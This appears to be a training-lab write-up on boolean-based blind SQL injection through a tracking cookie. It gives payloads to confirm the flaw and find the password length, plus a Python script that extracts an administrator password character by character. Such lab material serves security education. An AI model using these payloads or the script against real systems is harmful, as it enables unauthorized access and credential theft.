# Lab: Blind SQL injection with conditional responses (Practitioner)

**Goal:** Find the password of the `administrator` user (usually 20 characters, lowercase + numbers).

**Tracking cookie:** Vulnerable to injection.

## Technique

Boolean-based blind SQLi. The application shows different content depending on whether the condition is true or false ("Welcome back" message appears only on true).

## Solution Approach

1. Confirm injection in TrackingId cookie:

```
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

2. Extract password length:

```
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
```

3. Extract password character by character (binary search or sequential):

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Use Burp Intruder or a script for automation.

## Example Python Exploit Skeleton

```python
import requests
import string

lab = "https://YOUR-LAB-ID.web-security-academy.net"
cookies = {"TrackingId": "YOUR_TRACKING_ID", "session": "YOUR_SESSION"}

password = ""
for i in range(1, 21):
    for c in string.ascii_lowercase + string.digits:
        payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}'--"
        cookies["TrackingId"] = "xyz" + payload
        r = requests.get(lab, cookies=cookies)
        if "Welcome back" in r.text:
            password += c
            print(password)
            break
print("Password:", password)
```
